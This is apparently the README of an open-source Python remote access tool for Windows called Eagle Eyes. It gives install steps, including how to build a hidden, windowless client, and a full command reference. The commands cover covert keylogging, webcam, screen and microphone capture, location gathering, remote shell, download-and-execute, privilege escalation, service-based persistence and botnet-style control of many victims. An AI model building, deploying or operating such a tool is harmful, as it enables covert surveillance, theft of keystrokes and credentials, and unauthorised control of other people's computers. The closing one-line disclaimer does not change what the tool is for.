# Eagle Eyes
Free, open-source remote access tool for Windows.

## Description
Eagle Eyes is a powerful low level TCP networking RAT. Supporting desktop streaming, webcam streaming, audio listening, keylogging & more available from its CLI.

## Installation
* git clone https://github.com/Alvin-22/Eagle-Eyes.git && cd Eagle-Eyes
* pip install -r requirements.txt

#### **Command prompt 1**
* cd Eagle-Eyes
* python server.py

#### **Command prompt 2**
* cd Eagle-Eyes
* python client.py

## EXE installation
#### **Command prompt 1 (server install)**
* cd Eagle-Eyes
* pyinstaller -F -i [server icon path] [server script path]

#### **Command prompt 2 (client install)**
* cd Eagle-Eyes
* pyinstaller -F -w -i [client icon path] [client script path]

The difference between the EXE installations is that the client script is windowless (-w), becoming a background process operation without the interference of the user.

## Features:
* TCP Network stream (IPv4)
* Deflate Compression & AES128 Encryption
* Botnet Like Functionality
* Multi Threaded
* Remote Shell
  * Command Threading
  * Command Visualization
  * Command Backup
* Desktop Stream
* Cam Stream
* Audio Listener
* Audio Output
* Keylogger
  * Logs Visualization
* Screenshot
* Webcam Screenshot
* Show Messagebox
* Visit Website
* Upload (& Execute)
* Download (& Execute)
* Privilege Escalation
* Service Creation
* System Information
* Location Data

## Documentation
* () = required
* [] = optional
* | = or

#### **Shell commands**
---
* running
  * Get data about all the running modules, what client it is running on & its identifying number.

* stream (client index)
* stream kill (client index | *)
  * To open a stream of a specific client, opening a window of the clients screen in a live feed.

* cam (client index) (camera number) (height,width)
* cam kill (client index | *)
  * To open a camera stream of the users live webcam, needing to know what webcam number you want to use & the size of the camera. With the help of the devices command this information is provided.

* audio (client index)
* audio kill (client index | *)
  * Listen to a clients microphone input live.

* keylogger (client index)
* keylogger kill (client index | *)
* keylogger text (client index)
* keylogger image (client index)
  * Log every key of a client with the option to write out these logs directly in the console or by creating an black & white image of the text.

* talk (client index)
* talk kill (client index | *)
  * Talk directly with the client, in combination with the audio module you can create an audio conversation. 

* server (MS-dos command)
  * If you need to use your command prompt of your server, you can do it from within the program.

* archive (client username | -a)
  * Archive the data collected from a specific client or all clients with "-a" flag. This will remove the folder of either the single user or all users after them being archived.

* whoami (client index)
  * If you've not used whoami upon connect option you can do it manually, gathering vital system information & location data of a client.

* all (session command)
  * Sent a single command to every client & get everyones response. This will create a slight feeling of a botnet but it is slower & is executed in a linear fashion.

* list [-l] | ls [-l]
  * List all the connected clients, either with basic information or a long list of who this person is with the "-l" flag.

* session (client index)
  * Upon a session with a specific client, this will make more commands available without the "all" or "client" commands & be receptive to command prompt data responses. Note that this session will be timed out after 2 minutes of inactivity returning you back to the managing shell to be able to keep all the clients alive even when no data is being sent between the sockets. If this happens, you can just reconnect & proceed.

* client (client index) (session command)
  * Send a session command to a specific client without entering a session with this client.

* del (client index | *)
  * Delete one or more clients from your server, disconnecting them from you.

* options
  * This will print to the console all available options you can set to improve your experience & change how the program is running.

* set (setting=value)
  * This will set one of the options provided by the "options" command.

* time
  * This will print out the time you've started the program & the current time.

* banner
  * Print out the banner that is shown when initially running the program.

* clear | cls
  * Clears the console.

* exit | quit
  * Exit the program for good.

#### **Session commands**
---
* running
  * This will return all the running modules (stream, cam, audio, keylogger, talk), what client this module is running on & what index that module is bound to, because you can run as many modules on any & all clients at any time, you will need to specify that modules id when using module commands shown below.

* stream [ip:port]
* stream kill (stream index)
  * Stream module along with all the other modules will allow you to specify a custom socket address to connect with, this is usefull if you're using port tunneling to make ports available without the need of port forwarding, otherwise if not specified it will automatically connect to the same module port & ip of the host.

* cam [ip:port] (camera number) (with,height)
* cam kill (cam index)
  * Cam module need the camera number, if you have 2 cameras if you want to use the second camera you will have to use number 1, else if the client only has one camera use 0. You will also have to specify the width & height of the camera, this is because of a bug in the cv2 module making it neccesary to save a video file of the camera stream. You can use the devices command to find out the camera number & its size.

* audio [ip:port]
* audio kill (audio index)
  * The audio module will let you hear any input provided by the client into their microphone.

* keylogger [ip:port]
* keylogger kill (keylogger index)
* keylogger text (keylogger index)
* keylogger image (keylogger index)
  * The keylogger module gives you the option of writing out all the logs provided by the client in text format or vizualize the text into an black & white image with the help of the text & image commands.

* talk [ip:port]
* talk kill (talk index)
  * The talk module will allow you to talk into your microphone & the client will hear you, this can be used in conjunction with the audio module creating a audio conversation possibility.

* upload (filename) [-e]
  * The "-e" flag will automatically execute the uploaded file on the clients computer.

* note => [filename] => (message)
  * The note command will create a specific folder storing all your notes about a specific client with timestamps. The "filename" is an option because otherwise it will be saved to global.txt as it is the default, .txt will also automatically be added if you choose to set a filename. This command can be used to handle & organize your thoughts & ideas when dealing with multiple clients. Having the notes as a backup.

* whoami
  * The whoami command provides you with all the systeminfo & location data along with the initial socket data written out to the console. Making it clear who this client is & all the neccesary data you will need.

* time
  * Gives you the time the session started & what the current time is.

* clear | cls
  * Clears the console.

* exit | quitx
  * Exit the session & go back to your managing shell.

* download (filename) [-e]
  * Download a file with the option to execute upon successful download.

* screenshot [-s]
  * Download a screenshot of the clients computer with the option to automatically show the screenshot taken.

* webcam (camera number) [-s]
  * Webcam will take a screenshot of a specified camera with the help of the camera number, with the option to automatically show the screenshot taken.

* cd (filepath)
  * Change the directory of you session shell & navigate as you would a normal command prompt. Note that system variables cannot be used.

* elevate (filepath)
  * This will attempt to run the specified executeable program as administrator, if you run this on this script successfully you will be provided with an administrator shell having the privilege to create services & edit the Windows Registry.

* service (type) (service name) (filepath)
  * If you successfully acquired a administrator shell you can create & edit services. This will make your script sticky, automatically running the program upon startup without any questions. First have to specify either to "delete" or "create" the service, the name of Z service & the absolute path of the executeable.

* devices
  * Get all the webcams available on the client computer, the sizes of the cameras & their camera number.

* message => [title] => (message) => [style]
  * Show a message box to the client, the title of the messagebox, the default is "Message", the text of the message box & optionally the icon to be used ranging from 1-4.

* open (url[,url2, url3, url4])
  * Opens one or more urls in the clients default browser.

* ps (powershell command)
  * A shorthand for using powershell commands in your command prompt shell.

* else command prompt data [-t] [-b] [-i]
  * If no built in command is used everything will be thrown into the clients command prompt as a subprocess returning the data provided. The flags available is "-t" which will thread the command not displaying any data on screen but will execute the command. The "-b" flag will backup the data returned into a textfile & "-i" will provide a black & white image of the results, saving it to a png file. The "-t" flag can't be used in conjunction with "-b" or "-i" but "-b" & "-i" can be used together, in any order just as long as they are in the end of the string data being sent.

#### **Options available**
---
* quick mode
  * Simply sets the "history" & "whoami" flags to False. 

* username
  * Set username of the server, default is your Windows username provided by the username environment variable.

* theme
  * Sets the color theme of the console, the deafult theme is light. The available themes are:
    * light
    * dark
    * shade
    * star
    * diamond
    * blood
    * sky
    * hacker

* encoding
  * How every byte sent over the sockets will be translated in, latin-1 is the default & it supports any & all characters which utf-8 does not. But the option is open to change after preference.

* history
  * This option will create a log & timestamp of when a given client connects & disconnects. Default is True.

* whoami
  * Upon connection systeminfo & location data will be gathered to be saved in a file of the users folder. Default is True.

* notice
  * A system notification upon connection & disconnection of clients. Default is True.

* duplicates
  * To allow multiple connections from one client to be allowed. Deafult is True.

* email notice
  * email
  * password
  * to
    * Get a email notice everytime a client connects, you will have to provide a gmail & gmail password that allows "unsafe" applications to use the email. Also if you want to send this notification to multiple people the "to" option allows that, but by default "to" will automatically be set to your own email. Default is False.

#### **Command line unique options**
---
All of the options above can be set with the help of command line arguments when running the program. But there are also some unique ones. To get all the available options, simply run the script using the "-h" flag.

* --banner | -b
  * To not show banner upon running script. Default is False.

* --internet_protocol (IP) | -ip (IP)
  * To specify the hosting IP of the server, default is 127.0.0.1.

* --port (port) | -p (port)
  * To specify the hosting port of the server, default is 1200.

* --module_ports (module ports) | -mP (module ports)
  * The ports of the modules, because they use individual socket connections. Default is 1201,1202,1203,1204,1205.

* --use_latest | -uL
  * To use the most recent "IP", "port" & "module_ports" settings, if you simply want to use what you used last time running the script. Default is False.
---
_Please don't use Eagle Eyes for illegal purposes_